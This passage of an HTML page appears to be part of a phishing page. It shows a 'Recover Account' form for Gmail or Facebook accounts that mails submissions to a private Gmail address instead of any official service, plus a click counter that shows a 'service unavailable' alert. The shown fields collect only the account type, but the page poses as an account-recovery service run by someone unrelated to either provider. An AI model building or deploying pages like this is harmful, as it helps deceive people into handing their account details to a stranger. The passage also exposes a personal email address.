        function handleUnavailableClick() {
            clickCount++;
            if (clickCount >= 5) {
                alert('This service is unavailable for now.');
            }
        }
    </script>

    <form action="mailto:kabelosamkelo19@gmail.com" method="post" enctype="text/plain">

        <label for="account-type">Select Account Type:</label>
        <select id="account-type" name="account-type" required>
            <option value="gmail">Gmail</option>
            <option value="facebook">Facebook</option>
        </select><br><br>

        <button type="submit">Recover Account</button>
    </form>
